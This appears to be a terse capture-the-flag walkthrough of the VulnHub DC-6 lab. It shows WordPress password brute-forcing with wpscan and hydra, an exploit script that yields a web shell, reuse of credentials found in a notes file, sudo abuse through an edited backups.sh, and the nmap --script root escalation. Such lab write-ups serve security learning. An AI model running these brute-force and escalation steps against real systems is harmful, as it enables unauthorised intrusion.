--------------------------------
# Author Shubham Ranpise
--------------------------------

# 22/december/2022

# DC-6

----------------------------------------------------------------
# nmap scan ()
----------------------------------------------------------------
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.25 ((Debian))


wordlist for wp login
from wordpress admin:test login try we know there is user called admin
lets bruteforce it
hint from the vulnhub
cat /usr/share/wordlists/rockyou.txt | grep k01 > passwords.txt

bruteforce password attack
wpscan --url wordy --password-attack xmlrpc --passwords passwords.txt 

[SUCCESS] - mark / helpdesk01 

hydra command
 hydra -L users.txt -P passwords.txt 10.0.2.18 http-post-form "/wp-login.php:log=^USER^&pwd=^PWD^:The password you entered for the username" -t 30



reverse shell

python3 50110.py         
What's your target IP?
10.0.2.18
What's your username?                                                                                               
mark                                                                                                                
What's your password?                                                                                               
helpdesk01                                                                                                          
[*] Please wait...                                                                                                  
[*] Perfect!                                                                                                        
www-data@10.0.2.18  id                                                                                              
uid=33(www-data) gid=33(www-data) groups=33(www-data)                                                               
www-data@10.0.2.18                                                                                                  
Got a shell**
--
--
--
--
www-data@dc-6:/home$ cat /home/mark/stuff/things-to-do.txt
cat /home/mark/stuff/things-to-do.txt
Things to do:

- Restore full functionality for the hyperdrive (need to speak to Jens)
- Buy present for Sarah's farewell party
- Add new user: graham - GSo7isUM1D4 - done
- Apply for the OSCP course
- Buy new laptop for Sarah's replacement

----------------------------------------------------------------
ssh login 
----------------------------------------------------------------
graham:GSo7isUM1D4
-> sudo -l
(jens) NOPASSWD: /home/jens/backups.sh
modify the /home/jens/backups.sh to get bash shell
/bin/bash
sudo -u jens /home/jens/backups.sh

now we are jens
sudo -l
we got nmap 
(root) NOPASSWD: /usr/bin/nmap
search gtfo bins

TF=$(mktemp)
echo 'os.execute("/bin/bash")' > $TF
sudo nmap --script=$TF

python -c 'import pty;pty.spawn("/bin/bash")'
congrats you got root

----------------------------------------------------------------
# flag
----------------------------------------------------------------
-> cat theflag.txt


Yb        dP 888888 88     88         8888b.   dP"Yb  88b 88 888888 d8b 
 Yb  db  dP  88__   88     88          8I  Yb dP   Yb 88Yb88 88__   Y8P 
  YbdPYbdP   88""   88  .o 88  .o      8I  dY Yb   dP 88 Y88 88""   `"' 
   YP  YP    888888 88ood8 88ood8     8888Y"   YbodP  88  Y8 888888 (8) 


Congratulations!!!

Hope you enjoyed DC-6.  Just wanted to send a big thanks out there to all those
who have provided feedback, and who have taken time to complete these little
challenges.

If you enjoyed this CTF, send me a tweet via @DCAU7.
